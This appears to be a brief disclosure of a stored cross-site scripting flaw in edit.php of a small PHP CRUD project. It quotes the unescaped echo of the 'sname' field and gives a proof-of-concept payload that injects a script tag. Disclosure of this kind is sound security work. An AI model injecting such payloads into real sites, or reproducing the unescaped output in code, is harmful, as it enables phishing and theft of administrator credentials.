# crud-operation-system-in-php has Based Cross Site Scripting vulnerability in edit.php

## supplier 
https://code-projects.org/crud-operation-system-in-php-with-source-code/
## Vulnerability file
edit.php and sname parameter
## describe
There is an  Cross Site Scripting vulnerability in f crud system  in edit.php,  Control parameter: sname

Malicious attackers can use this cross-site scripting vulnerability to conduct phishing attacks and obtain administrator login information and permissions.

**Code analysis**

```
 <input type="text" name="sname" value="<?php echo $row['sname']; ?>"/>
```

echo $row['sname']; in no filter. 

![image-20241123145102714](https://github.com/user-attachments/assets/daf1e06b-58aa-4b72-892e-6a3e5bdf47a8)

## POC

sname insert into database;

```
"/><script>alert(2);</script>
```

![image-20241123145916800](https://github.com/user-attachments/assets/95a3c636-1a72-4397-afb0-1b738e4906e0)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://localhost/crud/edit.php?id=1
```

**Result**

![image-20241123145929562](https://github.com/user-attachments/assets/b0f5321b-fcbf-4264-be4e-827c133233d8)

 
